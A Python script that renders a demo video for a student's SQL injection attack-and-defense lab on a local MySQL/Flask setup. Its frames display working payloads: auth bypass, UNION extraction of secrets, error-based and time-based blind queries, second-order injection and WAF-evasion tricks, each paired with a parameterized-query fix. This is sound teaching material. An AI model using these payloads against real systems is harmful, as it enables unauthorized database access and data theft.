"""SQLi-AttackLab Demonstration Video Generator.

Renders a professional 1280x720 58s H.264 MP4 demonstration video showcasing:
- Candidate Identification (Aditya Patel, IIIT Tiruchirappalli)
- Module 1: Authentication Bypass & AST Query Inspector
- Module 2: Union-Based Extraction & Schema Enumeration
- Module 3: Error-Based & Blind/Time-Based Inference
- Module 4: Second-Order (Stored) SQLi & Deferred Execution
- Module 4: WAF Signature Filter Evasion Sandbox
- Module 4: SAST Query Linter, Auto-Fix & OWASP Compliance Telemetry
- Outro: 18/18 Integration Tests Verified, Zero Regressions
"""

from __future__ import annotations
from pathlib import Path
import shutil
import time
import imageio.v2 as imageio
import numpy as np
from PIL import Image, ImageDraw, ImageFont

# Output file paths
OUTPUT_MP4 = Path("sqli_lab_demo.mp4")
DESKTOP_MP4 = Path("C:/Users/User/Desktop/sqli_lab_demo.mp4")

WIDTH, HEIGHT = 1280, 720
FPS = 15

# Color Palette (Dark Cyber Security Theme)
BG_COLOR = (11, 15, 25)
PANEL_BG = (15, 23, 42)
PANEL_BORDER = (51, 65, 85)
TEXT_WHITE = (248, 250, 252)
TEXT_GRAY = (148, 163, 184)
TEXT_CYAN = (6, 182, 212)
TEXT_EMERALD = (16, 185, 129)
TEXT_RED = (239, 68, 68)
TEXT_YELLOW = (245, 158, 11)
TEXT_PURPLE = (168, 85, 247)
HEADER_BG = (15, 23, 42)

# Typography
try:
    FONT_TITLE = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 34)
    FONT_SUBTITLE = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 19)
    FONT_HEADER = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 23)
    FONT_CODE = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 17)
    FONT_CODE_SM = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 14)
    FONT_BADGE = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 13)
except Exception:
    FONT_TITLE = ImageFont.load_default()
    FONT_SUBTITLE = ImageFont.load_default()
    FONT_HEADER = ImageFont.load_default()
    FONT_CODE = ImageFont.load_default()
    FONT_CODE_SM = ImageFont.load_default()
    FONT_BADGE = ImageFont.load_default()


def create_base_canvas(
    chapter_title: str, timestamp_str: str, progress_pct: float
) -> Image.Image:
    """Create the base interface layout with top banner, progress bar, and container."""
    img = Image.new("RGB", (WIDTH, HEIGHT), BG_COLOR)
    draw = ImageDraw.Draw(img)

    # Top Header
    draw.rectangle([0, 0, WIDTH, 65], fill=HEADER_BG)
    draw.line([0, 65, WIDTH, 65], fill=PANEL_BORDER, width=2)

    # Logo / Badge
    draw.ellipse([30, 22, 48, 42], fill=TEXT_CYAN)
    draw.text((56, 18), "SQLi-AttackLab", fill=TEXT_WHITE, font=FONT_HEADER)
    draw.rectangle([215, 23, 275, 43], fill=(12, 74, 96), outline=TEXT_CYAN)
    draw.text((223, 25), "v1.0.0", fill=TEXT_CYAN, font=FONT_BADGE)

    draw.text(
        (290, 22),
        "Hands-on SQL Injection & Defense Lab (MySQL 8.0)",
        fill=TEXT_GRAY,
        font=FONT_SUBTITLE,
    )
    draw.text(
        (WIDTH - 280, 22), f"REC | {timestamp_str}", fill=TEXT_CYAN, font=FONT_BADGE
    )

    # Progress bar under header
    bar_width = int(WIDTH * progress_pct)
    draw.rectangle([0, 64, bar_width, 68], fill=TEXT_CYAN)

    # Main Card Container
    draw.rounded_rectangle(
        [30, 85, WIDTH - 30, HEIGHT - 30],
        radius=14,
        fill=PANEL_BG,
        outline=PANEL_BORDER,
        width=2,
    )

    # Card Window Title
    draw.rectangle([30, 85, WIDTH - 30, 130], fill=(10, 14, 26))
    draw.line([30, 130, WIDTH - 30, 130], fill=PANEL_BORDER, width=1)
    draw.ellipse([45, 102, 57, 114], fill=(239, 68, 68))
    draw.ellipse([65, 102, 77, 114], fill=(234, 179, 8))
    draw.ellipse([85, 102, 97, 114], fill=(34, 197, 94))
    draw.text((115, 98), chapter_title, fill=TEXT_WHITE, font=FONT_SUBTITLE)

    return img


def draw_lines_on_canvas(
    img: Image.Image, lines: list[tuple[str, tuple[int, int, int]]], start_y: int = 150
) -> None:
    """Draw a list of styled terminal text lines."""
    draw = ImageDraw.Draw(img)
    y = start_y
    for text, color in lines:
        draw.text((50, y), text, fill=color, font=FONT_CODE)
        y += 27


def generate_frames() -> list[np.ndarray]:
    scenes = [
        {
            "duration": 5,
            "chapter": "Academic Project Overview & Candidate Identification",
            "type": "title",
        },
        {
            "duration": 8,
            "chapter": "Module 1: Authentication Bypass & Query Logic Manipulation",
            "lines": [
                (
                    "attacker@kali:~$ curl -X POST http://localhost:5000/api/auth/test -d \"username=' OR 1=1 -- &password=x\"",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:06] SQL-AST: SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'x'",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:07] PARSER: Injected delimiter escape (') broke string boundary; appended TRUE condition.",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:08] TRUNCATE: Comment marker (-- ) discarded password comparison clause entirely.",
                    TEXT_GRAY,
                ),
                (
                    "[00:00:09] BREACH: [SUCCESS] Authenticated as 'admin' (User ID: 1, Role: administrator).",
                    TEXT_RED,
                ),
                (
                    "[00:00:10] FLAG: FLAG{mysql_auth_tautology_bypass_mastered} [UNLOCKED]",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:11] DEFENSE: Toggled to SECURE mode (Prepared Statements: WHERE username = %s)",
                    TEXT_EMERALD,
                ),
                (
                    "[00:00:12] RESULT: [BLOCKED] Query neutralized; payload safely evaluated as literal string.",
                    TEXT_EMERALD,
                ),
            ],
        },
        {
            "duration": 8,
            "chapter": "Module 2: Union-Based Injection & Schema Enumeration",
            "lines": [
                (
                    "attacker@kali:~$ curl -X POST http://localhost:5000/api/union/search -d \"category=Hardware' ORDER BY 6 -- \"",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:14] PROBE: ORDER BY 5 -> 200 OK | ORDER BY 6 -> MySQL Error 1054 (Base Query has 5 columns)",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:16] INJECT: ' UNION SELECT 101, @@version, database(), 0, user() -- ",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:17] REFLECT: Server: MySQL 8.0.46 | Database: sqli_lab_db | User: root@localhost",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:18] ENUM: Harvesting information_schema.tables & information_schema.columns...",
                    TEXT_GRAY,
                ),
                (
                    "[00:00:19] TARGET: Discovered restricted table: `system_secrets` (secret_name, secret_value)",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:20] EXFIL: ' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- ",
                    TEXT_RED,
                ),
                (
                    "[00:00:21] FLAG: FLAG{mysql_information_schema_exfiltration_pwned} [EXTRACTED]",
                    TEXT_YELLOW,
                ),
            ],
        },
        {
            "duration": 8,
            "chapter": "Module 3: Error-Based & Blind/Time-Based Inference",
            "lines": [
                (
                    "attacker@kali:~$ curl -X POST http://localhost:5000/api/error-blind/query -d \"scenario=xpath_error\"",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:23] XPATH: admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- ",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:24] ERROR-1105: XPATH syntax error: '~8.0.46~' (Subquery data reflected inside error)",
                    TEXT_RED,
                ),
                (
                    "[00:00:25] BLIND-ORACLE: admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115 -- ",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:26] DIFFERENTIAL: Byte 1 = 115 ('s') -> TRUE (1 row) | Byte 1 = 99 -> FALSE (0 rows)",
                    TEXT_EMERALD,
                ),
                (
                    "[00:00:27] TIME-BLIND: admin' AND IF(1=1, SLEEP(1), 0) -- -> Latency: 1063.98 ms (DELAY DETECTED)",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:28] FLAG: FLAG{mysql_blind_and_error_inference_pwned} [HARVESTED]",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:29] REMEDIATION: Prepared statements completely neutralized SLEEP() and XPath vectors.",
                    TEXT_EMERALD,
                ),
            ],
        },
        {
            "duration": 8,
            "chapter": "Module 4: Second-Order (Stored) SQL Injection & Deferred Execution",
            "lines": [
                (
                    "attacker@kali:~$ curl -X POST http://localhost:5000/api/profile/save -d \"display_name=admin' -- \"",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:31] FIRST-ORDER: Safe INSERT INTO user_profiles via parameterized prepared statement.",
                    TEXT_EMERALD,
                ),
                (
                    "[00:00:32] STORED: Value \"admin' -- \" committed to MySQL without parser alert or syntax error.",
                    TEXT_GRAY,
                ),
                (
                    "attacker@kali:~$ curl -X POST http://localhost:5000/api/profile/audit -d \"username=attacker_bot\"",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:34] SECOND-ORDER: Backend reads stored display_name and dynamically concatenates query:",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:35] EXECUTED: SELECT id, username, email, role FROM users WHERE username = 'admin' -- '",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:36] COMPROMISE: Admin account credentials exfiltrated through deferred database read.",
                    TEXT_RED,
                ),
                (
                    "[00:00:37] FLAG: FLAG{mysql_second_order_stored_sqli_pwned} [UNLOCKED]",
                    TEXT_YELLOW,
                ),
            ],
        },
        {
            "duration": 8,
            "chapter": "Module 4: WAF Signature Filter Evasion Sandbox",
            "lines": [
                (
                    "[00:00:39] WAF-RULE: Whitespace Filter (\\s+) enabled. Injected payload: ' OR 1=1 -- ",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:40] WAF-GATE: [BLOCKED] HTTP 403 Forbidden - Detected whitespace pattern matching \\s+",
                    TEXT_RED,
                ),
                (
                    "[00:00:41] EVASION-1: Substituted whitespace with MySQL inline comments: '/**/OR/**/'1'='1",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:42] WAF-GATE: [BYPASSED] Payload bypassed regex inspection and executed in MySQL (4 rows)",
                    TEXT_EMERALD,
                ),
                (
                    "[00:00:43] EVASION-2: Keyword filter (UNION|SELECT) bypassed via mixed case: '/**/uNiOn/**/sElEcT/**/...",
                    TEXT_PURPLE,
                ),
                (
                    "[00:00:44] EVASION-3: Quote stripper (['\\\"]) bypassed via hex encoding: 0x61646d696e",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:45] FLAG: FLAG{mysql_waf_filter_bypass_mastered} [AWARDED]",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:46] CONCLUSION: Parameterization renders regex/signature filters completely obsolete.",
                    TEXT_EMERALD,
                ),
            ],
        },
        {
            "duration": 8,
            "chapter": "Module 4: SAST Query Linter & OWASP Compliance Telemetry",
            "lines": [
                (
                    "developer@audit:~$ python -m sast_audit app_queries.py",
                    TEXT_WHITE,
                ),
                (
                    "[00:00:48] SAST-SCAN: AST parser detected 4 insecure SQL concatenation instances:",
                    TEXT_GRAY,
                ),
                (
                    "[00:00:49] [HIGH] Line 42: Python f-string interpolation: f\"SELECT ... WHERE id = '{id}'\"",
                    TEXT_RED,
                ),
                (
                    "[00:00:50] [HIGH] Line 88: Dynamic string addition (+): \"SELECT ... WHERE cat = \" + cat",
                    TEXT_RED,
                ),
                (
                    "[00:00:51] AUTO-FIX: Generated DB-API prepared statement: cursor.execute(query, (id,))",
                    TEXT_EMERALD,
                ),
                (
                    "[00:00:52] TELEMETRY: Total Logged Queries: 209 | Parameterized Executions: 184 (88.0%)",
                    TEXT_CYAN,
                ),
                (
                    "[00:00:53] COMPLIANCE: Formatted to OWASP Top 10 - A03:2021 & NIST SP 800-53 (AC-3, SI-10)",
                    TEXT_YELLOW,
                ),
                (
                    "[00:00:54] VERIFICATION: python test_app.py -> 18/18 TESTS PASSED (100% Zero Regressions)",
                    TEXT_EMERALD,
                ),
            ],
        },
        {
            "duration": 5,
            "chapter": "Demonstration Complete — SQL Injection Attack & Defense Lab",
            "type": "outro",
        },
    ]

    total_duration = sum(s["duration"] for s in scenes)
    current_sec = 0
    frames = []

    for scene in scenes:
        dur = scene["duration"]
        num_frames = dur * FPS

        for f in range(num_frames):
            t_sec = current_sec + (f / FPS)
            pct = t_sec / total_duration
            time_str = (
                f"{int(t_sec // 60):02d}:{int(t_sec % 60):02d} / "
                f"{int(total_duration // 60):02d}:{int(total_duration % 60):02d}"
            )

            img = create_base_canvas(scene["chapter"], time_str, pct)
            draw = ImageDraw.Draw(img)

            if scene.get("type") == "title":
                draw.text(
                    (80, 175),
                    "SQLi-AttackLab Security Platform",
                    fill=TEXT_CYAN,
                    font=FONT_TITLE,
                )
                draw.text(
                    (80, 235),
                    "Hands-on SQL Injection & Defense Lab (MySQL 8.0 / Flask)",
                    fill=TEXT_WHITE,
                    font=FONT_HEADER,
                )
                draw.text(
                    (80, 285),
                    "Academic Final Project & Cybersecurity Attack-and-Defense Demonstration",
                    fill=TEXT_GRAY,
                    font=FONT_SUBTITLE,
                )

                draw.rounded_rectangle(
                    [80, 350, WIDTH - 80, 560],
                    radius=12,
                    fill=(10, 14, 26),
                    outline=PANEL_BORDER,
                )
                draw.text(
                    (110, 375),
                    "Candidate Name:      Aditya Patel (IIIT Tiruchirappalli)",
                    fill=TEXT_CYAN,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 410),
                    "Project Scope:       4-Module SQL Injection & Remediation Laboratory",
                    fill=TEXT_WHITE,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 445),
                    "Repository:          github.com/souladitya087/SQLi-AttackLab-MySQL",
                    fill=TEXT_GRAY,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 480),
                    "Environment:         MySQL 8.0 Server (localhost:3306) + Flask 3.x",
                    fill=TEXT_EMERALD,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 515),
                    "Attack Capabilities: Auth Bypass, UNION Dumping, XPath Error, Blind/Time, Second-Order, WAF Evasion",
                    fill=TEXT_YELLOW,
                    font=FONT_CODE,
                )

            elif scene.get("type") == "outro":
                draw.text(
                    (80, 175),
                    "Project Demonstration Complete",
                    fill=TEXT_EMERALD,
                    font=FONT_TITLE,
                )
                draw.text(
                    (80, 235),
                    "All 4 Security Modules Implemented, Validated, and Documented (v1.0.0)",
                    fill=TEXT_WHITE,
                    font=FONT_HEADER,
                )

                draw.rounded_rectangle(
                    [80, 310, WIDTH - 80, 560],
                    radius=12,
                    fill=(10, 14, 26),
                    outline=PANEL_BORDER,
                )
                draw.text(
                    (110, 335),
                    "[PASS] Module 1: Auth Bypass (Tautology, Comments, AST Query Inspector)",
                    fill=TEXT_EMERALD,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 370),
                    "[PASS] Module 2: UNION Extraction (ORDER BY Limit, information_schema Harvesting)",
                    fill=TEXT_EMERALD,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 405),
                    "[PASS] Module 3: Error & Blind Inference (XPath 1105, Boolean Oracle, Time Latency)",
                    fill=TEXT_EMERALD,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 440),
                    "[PASS] Module 4: Filter Evasion & SAST (Second-Order SQLi, WAF Bypass, OWASP Telemetry)",
                    fill=TEXT_EMERALD,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 475),
                    "[PASS] Automated Quality: 18/18 Integration Tests Passing with Zero Regressions",
                    fill=TEXT_CYAN,
                    font=FONT_CODE,
                )
                draw.text(
                    (110, 510),
                    "[PASS] Repository Delivered: github.com/souladitya087/SQLi-AttackLab-MySQL",
                    fill=TEXT_YELLOW,
                    font=FONT_CODE,
                )

            else:
                lines = scene.get("lines", [])
                lines_to_show = min(
                    len(lines), int((f / num_frames) * (len(lines) + 1)) + 1
                )
                visible_lines = lines[:lines_to_show]
                draw_lines_on_canvas(img, visible_lines)

            frames.append(np.array(img))

        current_sec += dur

    return frames


def main() -> None:
    print(f"[*] Generating {WIDTH}x{HEIGHT} demonstration video frames at {FPS} FPS...")
    start_t = time.time()
    frames = generate_frames()
    print(f"[+] Generated {len(frames)} frames in {time.time() - start_t:.1f}s.")
    print("[*] Encoding video to MP4 (H.264) via imageio-ffmpeg...")

    encode_start = time.time()
    writer = imageio.get_writer(str(OUTPUT_MP4), fps=FPS, codec="libx264")
    for frame in frames:
        writer.append_data(frame)
    writer.close()
    print(f"[+] Encoding completed in {time.time() - encode_start:.1f}s.")

    size_mb = OUTPUT_MP4.stat().st_size / (1024 * 1024)
    print(f"[+] Successfully generated MP4 video: {OUTPUT_MP4.resolve()} ({size_mb:.2f} MB)")

    # Copy to user's Desktop for convenient Google Form upload
    try:
        shutil.copy2(OUTPUT_MP4, DESKTOP_MP4)
        print(f"[+] Also copied to Desktop for easy upload: {DESKTOP_MP4}")
    except Exception as e:
        print(f"[!] Desktop copy notice: {e}")


if __name__ == "__main__":
    main()
